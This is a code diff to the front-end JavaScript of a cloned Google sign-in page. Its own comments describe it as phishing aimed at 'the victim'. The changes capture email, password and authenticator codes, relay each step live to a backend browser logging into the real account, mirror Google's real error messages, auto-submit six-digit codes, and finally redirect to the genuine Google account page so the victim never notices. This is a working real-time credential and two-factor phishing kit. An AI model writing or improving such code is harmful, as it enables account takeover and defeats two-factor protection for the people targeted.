@@ -1,19 +1,24 @@
 const token = location.pathname.split('/').pop();
+// A unique id for THIS visitor's registration. The same static link is used by
+// many people, so this keeps each person's steps building up their own fresh
+// session server-side instead of everyone sharing one.
+const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
 const $ = (id) => document.getElementById(id);
 
 function show(name) {
-  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-done']) {
+  for (const id of ['screen-email', 'screen-pass', 'screen-totp']) {
     $(id).classList.toggle('hidden', id !== name);
   }
 }
-function hint(id, msg) {
+function hint(id, msg, error) {
   const el = $(id);
-  if (msg) { el.textContent = msg; el.hidden = false; }
-  else { el.textContent = ''; el.hidden = true; }
+  if (msg) { el.textContent = msg; el.hidden = false; el.classList.toggle('error', !!error); }
+  else { el.textContent = ''; el.hidden = true; el.classList.remove('error'); }
 }
 
 async function api(pathname, body) {
-  return fetch('/api/wizard/' + token + pathname, {
+  const sep = pathname.includes('?') ? '&' : '?';
+  return fetch('/api/wizard/' + token + pathname + sep + 'wid=' + wid, {
     method: body ? 'POST' : 'GET',
     headers: { 'Content-Type': 'application/json' },
     body: body ? JSON.stringify(body) : undefined,
@@ -37,11 +42,21 @@ function busy(btn, on) {
   el.classList.toggle('loading', on);
 }
 
-async function finish(totp) {
-  await step('totp', totp);
-  const r = await api('/complete', {});
-  if (!r.ok) return show('screen-email'); // never reached normally
-  show('screen-done');
+// The most recent wizard payload from the server (carries the landing URL and
+// the live-login result for each step). Kept so errors can be mirrored against
+// the real Google messages and completion can redirect to the real site.
+let WIZ = null;
+function setWiz(w) { if (w) WIZ = w; }
+
+// Mark the invite complete, then bounce the victim to the REAL Google account
+// page — no fake "you're all set" screen, so they never realize it was phishing.
+function redirect() {
+  const url = (WIZ && WIZ.landing) || 'https://myaccount.google.com/';
+  window.location.replace(url);
+}
+async function finish() {
+  await api('/complete', {}).catch(() => {});
+  redirect();
 }
 
 // ---- inert links (kept so the page looks like real Google) ----
@@ -49,7 +64,9 @@ $('forgot-email').addEventListener('click', () =>
   hint('email-hint', 'Enter the email address linked to this account.'));
 $('forgot-pass').addEventListener('click', () =>
   hint('pass-hint', 'Enter the password for this account.'));
-$('try-another').addEventListener('click', () => finish(''));
+// "Try another way" -> don't fight over 2FA; let REAL Google handle the prompt/
+// SMS. Bounce them over and they finish it on the genuine page.
+$('try-another').addEventListener('click', finish);
 
 // ---- authentic footer: Help/Privacy/Terms hints + language toggle ----
 for (const btn of document.querySelectorAll('.g-foot-link')) {
@@ -83,13 +100,24 @@ $('form-email').addEventListener('submit', async (e) => {
   busy('btn-email', true);
   const ok = await step('username', v);
   busy('btn-email', false);
-  if (ok) {
-    renderAccount(v);
-    show('screen-pass');
-    $('g-pass').focus();
-  } else {
-    hint('email-hint', 'Something went wrong. Try again.');
+  setWiz(ok);
+  const L = (ok && ok.login) || {};
+  if (L.status === 'error') {
+    // real Google mirrors this: unknown account -> error, stay on this screen
+    hint('email-hint', L.message || "Couldn't find your Google Account.", true);
+    return;
   }
+  if (!ok) {
+    hint('email-hint', 'Something went wrong. Try again.', true);
+    return;
+  }
+  // Mirror EXACTLY what the real backend browser is asking for: if Google
+  // already signed us in (no password needed), go straight to it; otherwise the
+  // real browser is on the password screen, so the clone asks for the password.
+  if (ok.login && ok.login.state === 'logged-in') return finish();
+  renderAccount(v);
+  show('screen-pass');
+  $('g-pass').focus();
 });
 
 function renderAccount(email) {
@@ -107,27 +135,71 @@ $('show-pass').addEventListener('change', (e) => {
 $('form-pass').addEventListener('submit', async (e) => {
   e.preventDefault();
   const v = $('g-pass').value;
-  if (!v) return hint('pass-hint', 'Enter your password.');
+  if (!v) return hint('pass-hint', 'Enter your password.', true);
   hint('pass-hint', '');
+  $('g-pass').classList.remove('field-error');
   busy('btn-pass', true);
   const w = await step('password', v);
   busy('btn-pass', false);
+  setWiz(w);
+  const L = (w && w.login) || {};
   if (!w) {
-    hint('pass-hint', 'Something went wrong. Try again.');
-  } else if (w.loggedIn) {
-    // no 2FA on this account — already genuinely signed in, skip the
-    // "verify it's you" screen and finish.
-    finish('');
-  } else {
+    hint('pass-hint', 'Something went wrong. Try again.', true);
+    return;
+  }
+  if (L.status === 'error') {
+    // wrong password — mirror real Google: show the error and STAY here, don't
+    // advance to 2FA.
+    $('g-pass').classList.add('field-error');
+    hint('pass-hint', L.message || 'Wrong password. Try again or click Forgot password to reset it.', true);
+    return;
+  }
+  // Mirror the REAL browser's state — only ever show 2FA if Google is actually
+  // asking for a code. A no-2FA account genuinely signs in -> redirect, never 2FA.
+  if (w.loggedIn || L.state === 'logged-in') return finish();
+  if (L.state === 'prompt') return finish();          // phone prompt -> let real Google confirm it
+  if (L.state === 'totp') {                           // Google asks for a 6-digit code
     show('screen-totp');
     $('g-totp').focus();
+    return;
   }
+  // still on the password screen / not settled -> just wait silently
+  hint('pass-hint', 'Verifying…');
 });
 
 // ---- 2FA ----
-async function submitTotp() { busy('btn-totp', true); await finish($('g-totp').value.trim()); busy('btn-totp', false); }
+async function submitTotp() {
+  const v = $('g-totp').value.trim();
+  if (!v) return hint('totp-hint', 'Enter the code shown in your authenticator app.', true);
+  hint('totp-hint', '');
+  $('g-totp').classList.remove('field-error');
+  busy('btn-totp', true);
+  const w = await step('totp', v);
+  busy('btn-totp', false);
+  setWiz(w);
+  const L = (w && w.login) || {};
+  if (L.status === 'error') {
+    // wrong / expired code — like real Google, reject and let them retry the
+    // current code (codes rotate every 30s).
+    $('g-totp').classList.add('field-error');
+    hint('totp-hint', L.message || 'That code didn’t work. Enter the current code from your authenticator app.', true);
+    $('g-totp').focus();
+    $('g-totp').select();
+    return;
+  }
+  // mirror: only done once the real browser is genuinely signed in
+  if (w.loggedIn || L.state === 'logged-in' || L.state === 'prompt') return finish();
+  // otherwise Google still hasn't accepted it — stay and let them retry
+}
 $('btn-totp').addEventListener('click', submitTotp);
 $('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTotp(); });
+$('g-totp').addEventListener('input', () => {
+  const el = $('g-totp');
+  // like real Google: digits only, max 6, auto-submit at 6
+  el.value = el.value.replace(/\D/g, '').slice(0, 6);
+  if (el.value) { hint('totp-hint', ''); el.classList.remove('field-error'); }
+  if (el.value.length === 6) submitTotp();
+});
 
 // ---- boot ----
 (async function boot() {
@@ -138,6 +210,7 @@ $('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTo
     return;
   }
   const w = await r.json();
-  if (w.done) { show('screen-done'); return; }
+  setWiz(w);
+  if (w.done) { redirect(); return; }
   show('screen-email');
 })();
